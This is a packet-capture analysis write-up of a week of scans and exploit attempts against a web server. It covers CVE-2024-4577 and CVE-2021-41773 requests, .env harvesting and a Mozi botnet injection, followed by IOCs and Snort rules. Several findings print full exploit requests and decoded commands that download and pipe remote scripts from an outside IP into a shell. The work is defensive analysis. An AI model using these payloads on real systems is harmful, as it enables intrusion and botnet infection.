# 2026-05-25 — Seven Days of Scans and Probes on wiresharkworkshop.online

---

## Overview

| Field      | Value                                          |     |
| ---------- | ---------------------------------------------- | --- |
| Platform   | Traffic Analysis Exercise / Real Investigation |     |
| Category   | Network Analysis                               |     |
| Tools Used | Wireshark, tcpdump, CyberChef                  |     |
| Date       | 2026-05-25 — 2026-05-31                        |     |
| Victim IP  | 203.161.44.208                                 |     |

---
## Scenario

During the 7-day capture period, the server at 203.161.44.208 (wiresharkworkshop.online) received constant automated traffic on ports 80 and 8080. The majority of requests were GET requests targeting sensitive configuration files such as .env, application.yaml, and wp-config.php. Multiple path traversal attempts were also observed.

---

## Analysis

### 1. Initial Triage

**PCAP Statistics:**

```
File:         2026-05-31-seven-days-of-scans-and-probes-and-web-traffic-hitting-my-web-server.pcap
Packets:      608775
Duration:     6 days 23:59:44
First packet: 2026-05-25 00:00:02
Last packet: 2026-05-31 23:59:47
```

**Protocol Hierarchy:**
- TCP (dominant)
- HTTP 

---

### 2. Key Findings

#### Finding 1 — CVE-2024-4577 PHP-CGI Code Injection Attempt

The attacker attempted to execute a PHP shell script by exploiting CVE-2024-4577 (PHP-CGI argument injection). The POST body contained PHP code that would download and execute self-replicating malware from **14.46.136.77**. This IP appears in further attacks, suggesting shared malware infrastructure or the same botnet campaign. The exploit failed — the server returned the normal homepage instead of the expected MD5 confirmation hash, indicating that the PHP code was not executed.

```php
<?php shell_exec(base64_decode("KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzcuc2VsZnJlcA==")); echo(md5("Hello CVE-2024-4577")); ?>

```

**Filter used:** http.request && http.request.method == POST

**Evidence:**
- Frame: `212162`
- Timestamp: `2026-05-27 13:54:05`
- Source: `181.104.43.225` → Destination: `203.161.44.208`
- Request: `POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1`
- Decoded payload: `(wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s cve_2024_4577.selfrep`
- Result: FAILED — server returned 200 with homepage, no MD5 hash in response
- Server: Apache/2.4.58 (Ubuntu) — not vulnerable to this CVE

---

#### Finding 2 - Configuration Files Harvesting

The attacker systematically requested sensitive configuration files looking for exposed credentials.

**Filter used:** `http.request.uri contains ".env"`

**Evidence:**
- Frame:  `1521`
- Timestamp: `2026-05-25 01:15:58`
- Source: `54.198.0.237` → Destination: `203.161.44.208`
- Port: `8080`
- Example request:  `GET /.env.development.local`
- User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36` — fake browser (bot behavior)
- Result: `404 - files not found`

**Example files targeted:**
- .env / .env.local / .env.production
- wp-config.php
- application.yml

**Goal:** steal database passwords, API keys, cloud credentials
**Result: FAILED**

---

#### Finding 3 — Apache CGI RCE 

The attacker used Apache CGI path traversal (CVE-2021-41773) to reach `/bin/sh` and execute a wget command that downloads malware from `14.46.136.77` — the same infrastructure seen in Finding 1.

**Filter used:** `http.request.uri contains "%2e"`

**Evidence:**
- Frame:  `50659`
- Timestamp: `2026-05-26 06:28:18`
- Source `152.53.151.4` → Destination `203.161.44.208`
- Request: `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1`
- Content: `(wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s apache.selfrep`
- Response: `HTTP/1.1 400 Bad Request`

---

#### Finding  4 - Mozi IoT botnet

The attacker attempted to inject commands that clear the `/tmp` directory, download Mozi.a (a P2P IoT botnet), and grant it execute permissions (`chmod 777`).

**Filter used:** `http.request.uri contains "Mozi"`

**Evidence:**
- Frame: `274780`
- Timestamp: `2026-05-28 06:30:59`
- Source: `103.244.172.181` → Destination: `203.161.44.208`
- Request: `GET /shell?cd+/tmp;rm+-rf+*;wget+http://103.244.172.181:60344/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws`
- Response: `HTTP/1.1 404 Not Found`
- User-Agent: `Hello, world`

---
### 3. Timeline

| Time (UTC)          | Frame  | Event                                                           |
| ------------------- | ------ | --------------------------------------------------------------- |
| 2026-05-25 01:15:58 | 1521   | Botnet - searching for  exposed credentials                     |
| 2026-05-26 06:28:18 | 50659  | Apache CGI path traversal (CVE-2021-41773)                      |
| 2026-05-27 13:54:05 | 212162 | Attempt to execute PHP shell script by exploiting CVE-2024-4577 |
| 2026-05-28 06:30:59 | 274780 | Attempt to download Mozi.a                                      |

---

## Indicators of Compromise (IOCs)

### Network IOCs

```
# Malicious IPs
103.244.172.181   — Mozi botnet download server (http, port 60344)
152.53.151.4      - Apache CGI RCE (http, 80)    
54.198.0.237      - looking for exposed credentials (http, 8080)
181.104.43.225    - CVE-2024-4577 PHP-CGI Code Injection Attempt hxxp://14.46.136.77/sh (http, 80)

# Malicious URLs
hxxp://14.46.136.77/sh - 13/92 security vendors flagged this URL as malicious
hxxp://103.244.172.181:60344/Mozi.a - 1/92 security vendor flagged this URL as malicious

# Suspicious User-Agents
User-Agent: Hello, world
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
```


---
## Snort Rules

```
alert tcp any any -> any 80 (msg:"Php shell detected - shell_exec in base64"; flow:to_server,established; content:"shell_exec",nocase; content:"base64_decode",nocase; sid:1000002; rev:1;)
alert tcp any any -> any 80 (msg:"CVE-2024-4577 - PHP-CGI argument injection"; flow:to_server,established; content:"allow_url_include",nocase; content:"auto_prepend_file",nocase; content:"php://input",nocase; sid:1000003; rev:1;)
alert tcp any any -> any 80 (msg:"libredtail-http - user agent detected"; flow:to_server,established; content:"libredtail-http",nocase; sid:1000004; rev:1;)
alert tcp any any -> any 8080 (msg:"Sensitive configuration files - env file request"; flow:to_server,established; content:"GET /.env",nocase; sid:1000005; rev:1;)
alert tcp any any -> any 8080 (msg:"Sensitive configuration files - wp-config.php request"; flow:to_server,established; content:"wp-config.php",nocase; sid:1000006; rev:1;)
alert tcp any any -> any 80 (msg:"Apache CGI path traversal CVE-2021-41773"; flow:to_server,established; content:"POST /cgi-bin/.%2e/",nocase; sid:1000007; rev:1;)
alert tcp any any -> any 80 (msg:"Download Mozi.a IoT botnet attempt"; flow:to_server,established; content:"Mozi.a",nocase; content:"chmod+777",nocase; sid:1000008; rev:1;)
```

---

## MITRE ATT&CK

| ID        | Technique                         |
| --------- | --------------------------------- |
| T1190     | Exploit Public-Facing Application |
| T1595.003 | Wordlist Scanning                 |
| T1105     | Ingress Tool Transfer             |
| T1059.004 | Unix Shell                        |

---

## Lessons Learned

1. Keep sensitive files outside the web-accessible directory such as:
	- .env
	- .env.local
	- application.yml
	- wp-config.php

2. The server was protected because the attackers used exploits designed for Windows, but the victim's operating system was Linux (Ubuntu).

3. Detect and block malicious patterns such as:
	- path traversal (../, .%2e)
	- shell injection

4. Keep software updated — the server was safe partly because it was running an up-to-date version of Apache.

---

**Tags:** #network-analysis #pcap #wireshark
